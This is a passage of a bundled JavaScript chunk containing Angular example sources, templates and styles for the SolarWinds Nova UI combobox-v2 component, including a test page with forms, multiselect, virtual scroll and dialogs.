}\n\n    public setItems(i: number): void {\n        this.items = this.itemSet[i];\n    }\n\n    public setMultiselectItems(i: number): void {\n        this.items = this.itemSet[i];\n    }\n\n    public convertToChip(value: string): { label: string } {\n        return { label: value };\n    }\n}\n'},28367:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [overlayConfig]="overlayConfig"\n    [syncWidth]="false"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},75287:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-v2-overlay-config-example",\n    templateUrl: "./combobox-v2-overlay-config.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2OverlayConfigExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    public overlayConfig: OverlayConfig = {\n        width: 300,\n        height: 200,\n        panelClass: [\n            OVERLAY_WITH_POPUP_STYLES_CLASS,\n            "overlay-config-demo-custom-class",\n        ],\n    };\n\n    public comboboxControl = new FormControl<string | null>(null);\n}\n'},10877:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="fancyForm" class="nui-edge-definer">\n    <nui-form-field\n        caption="Combobox"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls.combobox"\n    >\n        <nui-combobox-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            formControlName="combobox"\n            #combobox\n        >\n            <nui-select-v2-option *ngFor="let item of items" [value]="item">\n                <span [nuiComboboxV2OptionHighlight]="item"></span>\n            </nui-select-v2-option>\n        </nui-combobox-v2>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},5641:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-reactive-form-field-example",\n    templateUrl: "combobox-v2-reactive-form-field.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2ReactiveFormFieldExampleComponent {\n    public icons: any[] = ["check", "email", "execute"];\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public fancyForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.fancyForm = this.formBuilder.group({\n            combobox: this.formBuilder.control("", Validators.required),\n        });\n    }\n}\n'},53513:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [isRemoveValueEnabled]="false"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},11077:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-remove-value-example",\n    templateUrl: "combobox-v2-remove-value.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2RemoveValueExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl<string | null>(null);\n}\n'},46613:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<b>Setting value using <code>value</code> input</b>\n<nui-combobox-v2 [value]="items[0]" placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n\n<br />\n\n<b>Setting value using <code>FormControl</code></b>\n<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n'},17521:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-setting-value-example",\n    templateUrl: "combobox-v2-setting-value.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2SettingValueExampleComponent implements OnInit {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl<string | null>(null);\n\n    public ngOnInit(): void {\n        this.comboboxControl.setValue(this.items[1]);\n    }\n}\n'},74105:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [overlayConfig]="config"\n    style="width: 50%"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},91365:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// This is how the global styles look like\n\n.nui-overlay-styling-demo-custom-class {\n    border: 1px solid red;\n\n    .nui-overlay {\n        border: 2px red dashed;\n        padding: 10px;\n        background-color: antiquewhite;\n    }\n}\n"},93749:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-v2-styling-example",\n    templateUrl: "combobox-v2-styling.example.component.html",\n    styleUrls: ["combobox-v2-styling.example.component.less"],\n    // This is done to make class from the less file global.\n    // Make sure the class from the less file is added to your global style sheet.\n    encapsulation: ViewEncapsulation.None,\n})\nexport class ComboboxV2StylingExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    public config: OverlayConfig = {\n        panelClass: [\n            OVERLAY_WITH_POPUP_STYLES_CLASS,\n            "nui-overlay-styling-demo-custom-class",\n        ],\n    };\n}\n'},7589:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!-- Focus drop is an invisible item which can be used to drop the focus state to the start of the page if needed --\x3e\n<div class="focus-drop" tabindex="-1"></div>\n<div class="row mb-3 justify-content-center">\n    <h1>Combobox V2 Testing Page</h1>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Error State</h4>\n        <nui-combobox-v2\n            [isInErrorState]="!selectedItem"\n            placeholder="Select Item"\n            i18n-placeholder\n            [displayWith]="displayFn"\n            [formControl]="comboboxControl"\n            id="error"\n            [overlayConfig]="overlayConfig"\n            #comboboxError\n        >\n            <nui-select-v2-option\n                *ngFor="let item of customizedItems"\n                [value]="item"\n            >\n                <span\n                    class="mr-3"\n                    [nuiComboboxV2OptionHighlight]="item.name"\n                ></span>\n                <nui-icon [icon]="item.icon"></nui-icon>\n            </nui-select-v2-option>\n        </nui-combobox-v2>\n    </div>\n    <div class="col">\n        <h4>Reactive form</h4>\n        <form [formGroup]="fancyForm" class="nui-edge-definer">\n            <nui-form-field [control]="fancyForm.controls[\'combobox\']">\n                <nui-combobox-v2\n                    placeholder="Select Item"\n                    i18n-placeholder\n                    formControlName="combobox"\n                    id="form"\n                    [overlayConfig]="overlayConfig"\n                    #comboboxReactive\n                >\n                    <nui-select-v2-option\n                        *ngFor="let item of items"\n                        [value]="item"\n                    >\n                        <span [nuiComboboxV2OptionHighlight]="item"></span>\n                    </nui-select-v2-option>\n                </nui-combobox-v2>\n                <nui-validation-message for="required" i18n>\n                    This field is required\n                </nui-validation-message>\n            </nui-form-field>\n        </form>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Basic</h4>\n        <nui-combobox-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            id="basic"\n            [overlayConfig]="overlayConfig"\n            #comboboxBasic\n        >\n            <nui-select-v2-option *ngFor="let item of items" [value]="item">\n                <span [nuiComboboxV2OptionHighlight]="item"></span>\n            </nui-select-v2-option>\n        </nui-combobox-v2>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Single select with create option</h4>\n        <nui-combobox-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [formControl]="comboboxControlSingle"\n            id="single"\n            [overlayConfig]="overlayConfig"\n            #comboboxSingle\n        >\n            <nui-select-v2-option\n                *ngFor="let option of options; index"\n                [value]="option"\n                [isDisabled]="isDisabled(option)"\n            >\n                <div class="d-flex align-items-center">\n                    <span\n                        class="mr-3 nui-select-v2-option__label"\n                        [nuiComboboxV2OptionHighlight]="option"\n                    ></span>\n                </div>\n            </nui-select-v2-option>\n\n            <nui-overlay-item\n                *ngIf="comboboxSingle.canCreateOption | async"\n                class="nui-combobox-v2__create-option"\n                (click)="createOption(comboboxSingle.inputValue)"\n            >\n                Create option "{{ comboboxSingle.inputValue }}"\n            </nui-overlay-item>\n            <div\n                *ngIf="comboboxSingle.searchEmpty | async"\n                class="nui-combobox-v2__empty-search"\n                i18n\n            >\n                No other existing item available\n            </div>\n        </nui-combobox-v2>\n    </div>\n    <div class="col">\n        <h4>Multiselect with create option</h4>\n        <nui-combobox-v2\n            [placeholder]="\n                combobox.selectedOptions.length ? \'\' : \'Select Items\'\n            "\n            [formControl]="comboboxControlMulti"\n            [multiselect]="true"\n            [overlayConfig]="overlayConfig"\n            id="multi"\n            #combobox\n        >\n            <ng-container selectedItems>\n                <nui-chip\n                    nuiMarkAsSelectedItem\n                    *ngFor="let item of combobox?.value"\n                    class="ml-2"\n                    closeButtonTooltip="Remove"\n                    [item]="convertToChip(item)"\n                    (remove)="combobox.deselectItem(item)"\n                    (mouseup)="$event.stopPropagation()"\n                >\n                </nui-chip>\n            </ng-container>\n\n            <nui-select-v2-option\n                *ngFor="let option of optionsMulti"\n                [value]="option"\n                class="d-flex align-items-center"\n            >\n                <span\n                    class="mr-3 nui-select-v2-option__label"\n                    [nuiComboboxV2OptionHighlight]="option.name"\n                ></span>\n            </nui-select-v2-option>\n\n            <nui-overlay-item\n                *ngIf="combobox.canCreateOption | async"\n                class="nui-combobox-v2__create-option"\n                (click)="createOptionMulti(combobox.inputValue)"\n            >\n                Create option "{{ combobox.inputValue }}"\n            </nui-overlay-item>\n            <div\n                *ngIf="combobox.searchEmpty | async"\n                class="nui-combobox-v2__empty-search"\n                i18n\n            >\n                No other existing item available\n            </div>\n        </nui-combobox-v2>\n    </div>\n    <div class="col">\n        <h4>Disabled combobox and items</h4>\n        <div class="row m-auto">\n            <nui-combobox-v2\n                [isDisabled]="isComboboxDisabled"\n                placeholder="Select Item"\n                i18n-placeholder\n                id="disabled"\n                [overlayConfig]="overlayConfig"\n                class="flex-grow-1"\n                #comboboxDisabled\n            >\n                <nui-select-v2-option\n                    *ngFor="let item of optionsMulti.slice()"\n                    [value]="item"\n                    [isDisabled]="item.disabled"\n                >\n                    <span [nuiComboboxV2OptionHighlight]="item.name"></span>\n                </nui-select-v2-option>\n            </nui-combobox-v2>\n            <button\n                id="trigger-disabled"\n                (click)="isComboboxDisabled = !isComboboxDisabled"\n                class="ml-auto"\n            >\n                {{ isComboboxDisabled ? "enable" : "disable" }}\n            </button>\n        </div>\n    </div>\n</div>\n<div class="row mb-3">\n    <div class="col">\n        <h4>Value removal</h4>\n        <nui-combobox-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            [isRemoveValueEnabled]="false"\n            id="removal"\n            [overlayConfig]="overlayConfig"\n            #comboboxValueRemoval\n        >\n            <nui-select-v2-option *ngFor="let item of items" [value]="item">\n                <span [nuiComboboxV2OptionHighlight]="item"></span>\n            </nui-select-v2-option>\n        </nui-combobox-v2>\n    </div>\n    <div class="col"></div>\n    <div class="col"></div>\n</div>\n<div class="row m-auto">\n    <h4 class="w-100">Multiselect with manual dropdown control</h4>\n    <nui-combobox-v2\n        [placeholder]="\n            comboboxMultiDimensions.selectedOptions.length ? \'\' : \'Select Items\'\n        "\n        [multiselect]="true"\n        [manualDropdownControl]="true"\n        id="custom-control"\n        [overlayConfig]="overlayConfig"\n        #comboboxMultiDimensions\n    >\n        <ng-container selectedItems>\n            <nui-chip\n                nuiMarkAsSelectedItem\n                class="ml-2"\n                *ngFor="let item of comboboxMultiDimensions?.value"\n                closeButtonTooltip="Remove"\n                [item]="convertToChip(item)"\n                (remove)="comboboxMultiDimensions.deselectItem(item)"\n                (mouseup)="$event.stopPropagation()"\n            >\n            </nui-chip>\n        </ng-container>\n        <nui-select-v2-option\n            *ngFor="let option of optionsMultiDimensions"\n            [value]="option"\n            class="d-flex align-items-center"\n        >\n            <span\n                class="mr-3 nui-select-v2-option__label"\n                [nuiComboboxV2OptionHighlight]="option.name"\n            ></span>\n        </nui-select-v2-option>\n    </nui-combobox-v2>\n    <button id="show" class="ml-3" (click)="showList($event)">Show</button>\n    <button id="hide" class="ml-3" (click)="hideList($event)">Hide</button>\n    <button id="toggle" class="ml-3" (click)="toggleList($event)">\n        Toggle\n    </button>\n</div>\n<div class="row m-auto">\n    <h4 class="w-100">Virtual scroll</h4>\n    <nui-combobox-v2\n        placeholder="Select Item"\n        i18n-placeholder\n        #virtual\n        id="virtual-combobox"\n        [formControl]="comboboxControl"\n        [overlayConfig]="overlayConfig"\n        [isTypeaheadEnabled]="false"\n    >\n        <cdk-virtual-scroll-viewport\n            itemSize="30"\n            [minBufferPx]="300"\n            [maxBufferPx]="600"\n            [style.height.px]="containerHeight"\n        >\n            <div *cdkVirtualFor="let item of filteredItems | async; index as i">\n                <nui-select-v2-option\n                    [value]="item"\n                    class="d-flex align-items-center"\n                >\n                    <span [nuiComboboxV2OptionHighlight]="item"></span>\n                </nui-select-v2-option>\n            </div>\n        </cdk-virtual-scroll-viewport>\n    </nui-combobox-v2>\n</div>\n\n<div class="row mb-3" style="position: fixed; bottom: 0" tabindex="-1">\n    <h4 class="w-100">Multiselect with manual dropdown control</h4>\n    <nui-combobox-v2\n        [placeholder]="\n            comboboxWithDialog.selectedOptions.length ? \'\' : \'Select Items\'\n        "\n        [multiselect]="true"\n        [manualDropdownControl]="true"\n        [overlayConfig]="overlayConfig"\n        class="w-100"\n        #comboboxWithDialog\n    >\n        <ng-container selectedItems>\n            <nui-chip\n                nuiMarkAsSelectedItem\n                class="ml-2"\n                *ngFor="let item of comboboxWithDialog?.value"\n                closeButtonTooltip="Remove"\n                [item]="convertToChip(item)"\n                (remove)="comboboxWithDialog.deselectItem(item)"\n                (mouseup)="$event.stopPropagation()"\n            >\n            </nui-chip>\n        </ng-container>\n\n        <nui-select-v2-option\n            *ngFor="let option of optionsMultiDimensions"\n            [value]="option"\n            class="d-flex align-items-center"\n            (click)="openInOverlay(headerButtonsContent)"\n        >\n            <span\n                class="mr-3 nui-select-v2-option__label"\n                [nuiComboboxV2OptionHighlight]="option.name"\n            ></span>\n        </nui-select-v2-option>\n    </nui-combobox-v2>\n    <button class="ml-3" (click)="comboboxWithDialog.toggleDropdown()">\n        Toggle\n    </button>\n</div>\n\n<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button\n            nui-button\n            type="button"\n            (click)="actionCanceled(); close()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="actionDone(); close()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<ng-template #headerButtonsContent let-close="close">\n    <nui-dialog-header title="Dialog title" (closed)="close()">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            icon="fullscreen"\n        ></button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            icon="menu"\n        ></button>\n    </nui-dialog-header>\n    <div class="dialog-body">\n        <p>\n            <nui-select-v2 placeholder="Select Item">\n                <nui-select-v2-option\n                    *ngFor="let item of dataset.items; let i = index"\n                    [value]="item"\n                >\n                    <div class="d-flex align-items-center">\n                        <button\n                            nui-button\n                            type="button"\n                            (click)="confirm($event)"\n                        >\n                            boom!\n                        </button>\n                        {{ item }}\n                        <div\n                            #popoverContainer\n                            id="nui-demo-popover-container"\n                        ></div>\n                        <nui-popover\n                            id="nui-demo-popover-with-container"\n                            [container]="popoverContainer"\n                            [template]="popoverWithContainerTemplate"\n                            i18n\n                        >\n                            Hover over me!\n                        </nui-popover>\n\n                        <nui-popover\n                            popoverTitle="Modal Popover"\n                            i18n-popoverTitle\n                            trigger="click"\n                            placement="right"\n                            [template]="popoverModal"\n                            [modal]="true"\n                            [preventClosing]="true"\n                            [closePopover]="closePopoverSubject"\n                        >\n                            <button\n                                nui-button\n                                type="button"\n                                id="nui-demo-popover-modal"\n                                i18n\n                            >\n                                Show modal popover\n                            </button>\n                        </nui-popover>\n\n                        <ng-template #popoverModal>\n                            <span i18n\n                                >A modal popover can be used to grab the user\'s\n                                attention.</span\n                            >\n                            <div class="mt-2 d-flex justify-content-end">\n                                <button\n                                    id="nui-demo-custom-close-popover"\n                                    nui-button\n                                    type="button"\n                                    displayStyle="action"\n                                    (click)="closePopover()"\n                                    i18n\n                                >\n                                    Close\n                                </button>\n                                <button\n                                    nui-button\n                                    class="ml-3"\n                                    type="button"\n                                    displayStyle="primary"\n                                    (click)="closePopover()"\n                                    i18n\n                                >\n                                    Confirm\n                                </button>\n                            </div>\n                        </ng-template>\n\n                        <ng-template #popoverWithContainerTemplate i18n>\n                            I\'m appended to a container!\n                        </ng-template>\n                        <nui-menu icon="menu" *ngIf="!i">\n                            <nui-menu-action *ngFor="let item of items">\n                                {{ item }}\n                            </nui-menu-action>\n                        </nui-menu>\n                    </div>\n                </nui-select-v2-option>\n            </nui-select-v2>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Cancel\')">\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Action\')"\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},61062:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "components/combobox-v2-addons.less";\n\n.active {\n    .active-item();\n}\n\nnui-chip {\n    display: inline-flex;\n    cursor: pointer;\n    margin-bottom: 5px;\n    border-radius: 9px;\n}\n\n.focus-drop {\n    height: 1px;\n    width: 1px;\n}\n'},60929:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    Component,\n    OnInit,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\nimport { FormBuilder, FormControl, Validators } from "@angular/forms";\nimport { Observable, of, Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { delay, filter, takeUntil, tap } from "rxjs/operators";\n\nimport {\n    ComboboxV2Component,\n    DialogService,\n    NuiDialogRef,\n    OVERLAY_WITH_POPUP_STYLES_CLASS,\n    ToastService,\n} from "@nova-ui/bits";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n    icon?: string;\n    disabled?: boolean;\n}\n\nconst defaultContainerHeight: number = 300;\n\n@Component({\n    selector: "nui-combobox-v2-test-example",\n    templateUrl: "combobox-v2-test.example.component.html",\n    styleUrls: ["combobox-v2-test.example.component.less"],\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2TestExampleComponent implements OnInit, AfterViewInit {\n    public virtualItems = Array.from({ length: 100000 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public filteredItems: Observable<any[]> = of([...this.virtualItems]);\n    public containerHeight: number = defaultContainerHeight;\n    // Testing only\n    public overlayConfig: OverlayConfig = {\n        panelClass: [OVERLAY_WITH_POPUP_STYLES_CLASS, "combobox-v2-test-pane"],\n    };\n    // Data\n    public options = Array.from({ length: 3 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public optionsMulti: IExampleItem[] = Array.from({ length: 3 }).map(\n        (_, i) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${i}`,\n            disabled: i % 2 ? true : false,\n        })\n    );\n    public optionsMultiDimensions = this.getOptions(50, false);\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public icons: any[] = ["check", "email", "execute"];\n    public customizedItems: IExampleItem[] = Array.from({ length: 100 }).map(\n        (_, i) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${i}`,\n            icon: this.getRandomIcon(),\n        })\n    );\n    public selectedItem: IExampleItem | null;\n    public selectedSingleItem: string | null;\n    public isComboboxDisabled = false;\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n            "Item 11",\n            "Item 12",\n            "Item 13",\n            "Item 14",\n            "Item 15",\n            "Item 16",\n            "Item 17",\n            "Item 18",\n            "Item 19",\n            "Item 20",\n        ],\n    };\n    // Form\n    public error: 